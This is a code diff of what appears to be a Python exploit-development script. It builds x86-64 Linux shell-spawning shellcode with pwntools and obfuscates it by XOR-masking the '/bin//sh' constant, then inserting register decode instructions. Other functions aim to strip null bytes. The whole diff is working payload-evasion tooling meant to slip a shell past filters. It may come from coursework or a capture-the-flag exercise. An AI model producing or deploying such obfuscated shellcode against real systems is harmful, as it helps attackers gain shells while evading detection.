@@ -20,58 +20,87 @@ def nobinsh():
 
     mixer = "0x0202020202020202"
     space = "    "
-    i = 0
+    # i = 0
+    counter = 0
     raw = shellcraft.amd64.linux.sh()
     #print("length of shell: ", len(raw))
-    comment_line = raw[:-219]
-    binsh_line = raw[50:-173]
+    # comment_line = raw[:-219]
+    # binsh_line = raw[50:-173]
     #print("binsh line 2: ",binsh_line)
-    binsh = binsh_line[9:]
-    lenofbinsh = len(binsh)
-    lines = binsh.splitlines()
+    # binsh = binsh_line[9:]
+    # lenofbinsh = len(binsh)
+    lines = raw.splitlines()
+    # print("lines: \n", lines)
     for line in lines:
         # print("line test: \n",line)
         tokens = line.split()
         # print("TEST1: \n", tokens)
+        counter = counter + 1
         for word in tokens:
-            if word == "0x732f2f2f6e69622f":
+            if word == "0x732f2f2f6e69622f" or word == "0x68732f2f6e69622f":
                 # print("True")
                 # print("token: \n", tokens)
-                test_token = tokens
-                # print("token position: \n", test_token[2])
+                old_token = tokens
+                # print("token position: \n", old_token)
                 new_word = str(hex((int(word, 16) ^  int(mixer,16))))
                 # print("test value: ", new_word)
                 new_token = [words.replace(word,new_word) for words in tokens]
                 # print("previous token: \n", tokens)
                 # print("new token: \n", new_token)
                 strings = " "
+                old_binsh = strings.join(old_token)
                 binsh3 = strings.join(new_token)
+                # print("counter value: ", counter)
+                final_count = counter
                 # print("binsh3: \n", binsh3)
 
             # print("TEST2: \n", word)
 
     # print("TEST: \n", lines)
-    binsh2 = binsh[56:75]
+    # binsh2 = binsh[56:75]
+    test = [line.replace(old_binsh,binsh3) for line in lines]
+    # print("testing lines: \n",test)
+    # print("lines1: \n", lines[final_count])
     #print("TEST: ", test)
     #print("length of binsh", len(binsh))
     #print("binsh line: ",binsh)
     #binsh = str(hex((int(binsh, 16) ^  int(mixer,16))))
-    binsh = str(hex((int(binsh2, 16) ^  int(mixer,16))))
-    print("binsh value: ",binsh)
+    # binsh = str(hex((int(binsh2, 16) ^  int(mixer,16))))
+    # print("binsh value: ",binsh)
 
-    mangled_binsh = newline + space + binsh3 + newline
-    mangled_binsh += space + "mov r9, " + mixer + newline
-    mangled_binsh += space + "xor rax, r9"
+    # mangled_binsh1 = newline + space + binsh3 + newline
+    mangled_binsh1 = space + "mov r9, " + mixer
+    test.insert(final_count,mangled_binsh1)
+    # print("TESTING: \n", test)
+    final_count = final_count + 1
+    mangled_binsh1 = space + "xor rax, r9"
+    test.insert(final_count,mangled_binsh1)
+    length = len(test)
+    # print("TESTING1: \n", test[1])
+    i=0
+    while(i < length):
+        if i == 0:
+            final_shell = test[i] + "\n"
+        else:
+            final_shell += test[i] + "\n"
+        i = i + 1
+    # string = " "
+    # final_shell = string.join(test)
+    # print("TESTING2: \n", final_shell)
+
+    # mangled_binsh = newline + space + binsh3 + newline
+    # mangled_binsh += space + "mov r9, " + mixer + newline
+    # mangled_binsh += space + "xor rax, r9"
 
     # print("mangled_binsh: \n", mangled_binsh)
     # print("TEST: \n",raw[0:101])
     # print("TEST2: \n", raw[133:] )
     # print("TEST3: \n", raw[0:101] + mangled_binsh + raw[133:])
     # raw = raw.replace(binsh_line, mangled_binsh)
-    raw = raw[0:101] + mangled_binsh + raw[133:]
-    print("new raw: \n",raw)
+    # raw = raw[0:101] + mangled_binsh + raw[133:]
+    # print("new raw: \n",raw)
     # print("new raw value: ", raw)
-    return raw
+    return final_shell
 
 ################################################################
 # TODO: This removes all null values in the shell code. This is a
@@ -152,59 +181,68 @@ def combined(shellcode):
     space = "    "
     space1 = "   "
     i = 0
-    print("shellcode info2: \n",shellcode)
-    print("shellcode info: \n", shellcode[32:])
-    print("shellcode info1: \n", shellcode[32:67])
-    raw = shellcraft.amd64.linux.sh()
+    counter = 0
+    # print("shellcode info2: \n",shellcode)
+    # print("shellcode info: \n", shellcode[32:])
+    # print("shellcode info1: \n", shellcode[32:67])
+    # raw = shellcraft.amd64.linux.sh()
     #print("length of shell: ", len(raw))
-    comment_line = raw[:-219]
-    binsh_line = raw[50:-173]
+    # comment_line = raw[:-219]
+    # binsh_line = raw[50:-173]
     #print("binsh line 2: ",binsh_line)
-    binsh = binsh_line[9:]
-    lenofbinsh = len(binsh)
+    # binsh = binsh_line[9:]
+    # lenofbinsh = len(binsh)
     lines = shellcode.splitlines()
     for line in lines:
         # print("line test: \n",line)
         tokens = line.split()
         # print("TEST1: \n", tokens)
+        counter = counter+1
         for word in tokens:
             if word == "0x732f2f2f6e69622f" or word == "0x68732f2f6e69622f":
                 # print("True")
                 # print("token: \n", tokens)
-                test_token = tokens
-                # print("token position: \n", test_token[2])
+                old_token = tokens
+                # print("token position: \n", old_token[2])
                 new_word = str(hex((int(word, 16) ^  int(mixer,16))))
                 # print("test value: ", new_word)
                 new_token = [words.replace(word,new_word) for words in tokens]
                 # print("previous token: \n", tokens)
                 # print("new token: \n", new_token)
                 strings = " "
+                old_binsh = strings.join(old_token)
                 binsh3 = strings.join(new_token)
                 # print("binsh3: \n", binsh3)
                 register = tokens[1]
+                final_count = counter
                 # print("register of interest:",register)
                 # print("binsh3: \n", binsh3)
 
             # print("TEST2: \n", word)
 
     # print("TEST: \n", lines)
-    binsh2 = binsh[56:75]
+    # binsh2 = binsh[56:75]
+    test = [line.replace(old_binsh,binsh3) for line in lines]
     #print("TEST: ", test)
     #print("length of binsh", len(binsh))
     #print("binsh line: ",binsh)
     #binsh = str(hex((int(binsh, 16) ^  int(mixer,16))))
-    binsh = str(hex((int(binsh2, 16) ^  int(mixer,16))))
+    # binsh = str(hex((int(binsh2, 16) ^  int(mixer,16))))
     # print("binsh value: ",binsh)
-    mangled_binsh = space1 + binsh3 + newline
-    mangled_binsh += space + "mov r9, " + mixer + newline
-    mangled_binsh += space + "xor " +register+" r9" + newline + space
-    # print("mangled_binsh: \n",mangled_binsh)
-    # print("mangled_binsh: \n", mangled_binsh)
-    # print("TEST: \n",raw[0:101])
-    # print("TEST2: \n", raw[133:] )
-    # print("TEST3: \n", raw[0:101] + mangled_binsh + raw[133:])
-    # raw = raw.replace(binsh_line, mangled_binsh)
-    raw = shellcode[0:32] + mangled_binsh + shellcode[67:]
-    # print("new raw: \n",raw)
-    # print("new raw value: ", raw)
-    return raw
+    # mangled_binsh = space1 + binsh3 + newline
+
+    mangled_binsh = space + "mov r9, " + mixer
+    test.insert(final_count,mangled_binsh)
+    final_count = final_count+1
+    mangled_binsh = space + "xor " +register+" r9"
+    test.insert(final_count,mangled_binsh)
+    length = len(test)
+    while(i < length):
+        if i == 0:
+            final_shell = test[i] + "\n"
+        else:
+            final_shell += test[i] + "\n"
+        i = i + 1
+    print("TESTING2: \n", final_shell)
+    # raw = shellcode[0:32] + mangled_binsh + shellcode[67:]
+    return final_shell
